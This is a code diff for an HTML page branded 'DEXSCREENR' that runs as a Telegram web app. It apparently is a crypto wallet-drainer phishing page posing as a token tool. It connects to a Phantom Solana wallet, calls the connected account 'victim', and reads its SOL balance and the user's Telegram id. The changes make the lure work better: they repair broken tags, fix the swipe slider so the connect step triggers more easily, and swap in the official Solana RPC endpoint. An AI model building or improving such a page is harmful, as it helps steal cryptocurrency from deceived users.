@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial;-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title padding>DEXSCREENR</title>
-<script src="https:://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>DEXSCREENR</title>
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.9/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-  * { margin: 0 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif; }
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif; }
   body { background-color: #050505; color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; overflow: hidden; position: relative; }
   #telegram-screen { display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; width: 100%; max-width: 320px; position: absolute; z-index: 20; }
   .pulse-ring { width: 80px; height: 80px; border-radius: 50%; background: rgba(20, 241, 149, 0.1); display: flex; align-items: center; justify-content: center; margin-bottom: 24px; position: relative; }
@@ -60,6 +60,7 @@
   .status-text { font-size: 13px; margin-bottom: 20px; color: #a1a1aa; text-align: center; }
   .status-text span { color: #14F195; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
   
+  /* SLIDER FIX */
   .slider-container { width: 100%; height: 60px; background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 30px; position: relative; overflow: hidden; display: flex; flex-direction: row-reverse; align-items: center; padding: 4px; user-select: none; touch-action: none; }
   .slider-text { position: absolute; width: 100%; text-align: center; font-size: 14px; font-weight: 600; color: rgba(255, 255, 255, 0.5); pointer-events: none; z-index: 1; transition: opacity 0.3s; }
   .slider-thumb { width: 52px; height: 52px; background: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: grab; position: relative; z-index: 2; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); transition: transform 0.1s; touch-action: none; }
@@ -243,30 +244,31 @@
     maxDrag = container.offsetWidth - thumb.offsetWidth - 8; 
   }
   
-  thumb.addEventListener('pointerdown', (e) => {
-    if (container.classList.contains('loading') || container.classList.contains('success')) return; 
+  // TOUCH & MOUSE EVENTS (FIX FÜR ZURÜCKSPRINGEN)
+  function handleStart(e) {
+    if (container.classList.contains('loading') || container.classList.contains('success')) return;
     isDragging = true;
-    startX = e.clientX;
+    startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
     thumb.style.transition = 'none';
-    thumb.setPointerCapture(e.pointerId);
-  });
+  }
 
-  thumb.addEventListener('pointermove', (e) => {
+  function handleMove(e) {
     if (!isDragging) return;
-    let delta = startX - e.clientX; 
+    if (e.cancelable) e.preventDefault(); // Verhindert Scrollen
+    const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
+    let delta = startX - clientX; 
     if (delta < 0) delta = 0; 
     if (delta > maxDrag) delta = maxDrag;
     currentX = delta; 
     thumb.style.transform = `translateX(-${currentX}px)`;
     text.style.opacity = 1 - (currentX / maxDrag);
-  });
+  }
 
-  thumb.addEventListener('pointerup', (e) => {
-    if (!isDragging) return; 
+  function handleEnd() {
+    if (!isDragging) return;
     isDragging = false;
-    thumb.releasePointerCapture(e.pointerId);
     
-    if (currentX > maxDrag * 0.7) {
+    if (currentX > maxDrag * 0.5) { // 50% statt 70%, damit es leichter auslöst
       container.classList.add('loading'); text.style.opacity = 0;
       thumb.style.transition = 'transform 0.3s ease';
       thumb.style.transform = `translateX(-${maxDrag}px)`;
@@ -276,7 +278,15 @@
       thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
       thumb.style.transform = 'translateX(0)'; text.style.opacity = 1; currentX = 0;
     }
-  });
+  }
+
+  thumb.addEventListener('mousedown', handleStart);
+  window.addEventListener('mousemove', handleMove);
+  window.addEventListener('mouseup', handleEnd);
+
+  thumb.addEventListener('touchstart', handleStart, {passive: false});
+  window.addEventListener('touchmove', handleMove, {passive: false});
+  window.addEventListener('touchend', handleEnd);
 
   async function triggerConnect() {
     let provider = window.phantom?.solana;
@@ -286,7 +296,7 @@
       const victim = resp.publicKey.toString();
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
-      const conn = new solanaWeb3.Connection("https://solana-mainnet.rpc.extrnode.com"); 
+      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); 
       const solBalance = await conn.getBalance(resp.publicKey);
       const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) || "0";
       
@@ -351,6 +361,7 @@
   }
 
   window.addEventListener('resize', initSlider);
+  setTimeout(initSlider, 100);
 </script>
 </body>
 </html>
